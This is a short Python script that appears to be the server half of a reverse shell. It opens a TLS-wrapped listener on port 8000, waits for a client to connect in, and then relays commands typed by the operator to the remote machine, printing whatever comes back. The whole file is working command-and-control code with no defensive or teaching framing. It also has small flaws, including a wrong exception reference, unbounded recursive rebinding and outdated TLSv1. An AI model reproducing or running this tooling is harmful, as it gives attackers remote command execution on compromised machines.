# -*- coding = utf-8 -*-

import sys
import ssl
import socket

#create socket 
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 8000
        s = socket.socket()
        s = ssl.wrap_socket(s, certfile='twoday.crt', keyfile='twoday.key', ssl_version=ssl.PROTOCOL_TLSv1)
    except s.error as msg:
        print('create socket failed: ' + str(msg))

#Bind socket to port and wait client connect
def socket_bind():
    try:
        global s
        global host
        global port
        print("Binding socket to port: " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print('connect socket failed: ' + str(msg) + '\n')
        #Rebind
        socket_bind() 

#Establish connection with client
def socket_accpet():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_command(conn)
    conn.close()
    
#send the result of excuting command
def send_command(conn):
    while True:
        cmd = input('\n>>> ')
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        #if cmd has data
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_respone = str(conn.recv(1024))
            print(client_respone , end='')
    
if __name__ == "__main__":
    create_socket()
    socket_bind()
    socket_accpet()

